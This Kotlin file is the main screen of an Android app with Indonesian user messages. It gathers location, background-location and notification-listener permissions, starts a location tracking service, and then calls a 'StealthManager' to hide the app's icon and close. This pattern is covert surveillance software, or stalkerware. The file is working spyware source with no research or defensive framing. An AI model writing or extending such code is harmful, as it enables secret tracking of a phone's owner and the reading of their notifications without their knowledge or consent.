package app.gpslocation.id

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import app.gpslocation.id.services.LocationTrackingService
import app.gpslocation.id.services.StealthManager

class MainActivity : AppCompatActivity() {

    private val PERMISSION_REQUEST_CODE = 123

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        findViewById<Button>(R.id.btn_activate).setOnClickListener {
            if (checkAndRequestPermissions()) {
                startServicesAndHide()
            }
        }
    }

    private fun checkAndRequestPermissions(): Boolean {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missingPermissions = permissions.filter {
            ActivityCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), PERMISSION_REQUEST_CODE)
            return false
        }

        // Check for background location
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Mohon izinkan lokasi 'Sepanjang Waktu' di pengaturan.", Toast.LENGTH_LONG).show()
                ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), PERMISSION_REQUEST_CODE)
                return false
            }
        }

        // Check for notification access
        if (!isNotificationServiceEnabled()) {
            Toast.makeText(this, "Mohon izinkan akses notifikasi.", Toast.LENGTH_LONG).show()
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            return false
        }

        return true
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val pkgName = packageName
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(pkgName)
    }

    private fun startServicesAndHide() {
        // Start Location Service
        val intent = Intent(this, LocationTrackingService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        Toast.makeText(this, "Sistem telah diaktifkan.", Toast.LENGTH_SHORT).show()
        
        // Hide Icon
        findViewById<Button>(R.id.btn_activate).postDelayed({
            StealthManager.hideAppIcon(this)
            finish()
        }, 2000)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                startServicesAndHide()
            } else {
                Toast.makeText(this, "Izin diperlukan agar aplikasi berfungsi.", Toast.LENGTH_SHORT).show()
            }
        }
    }
}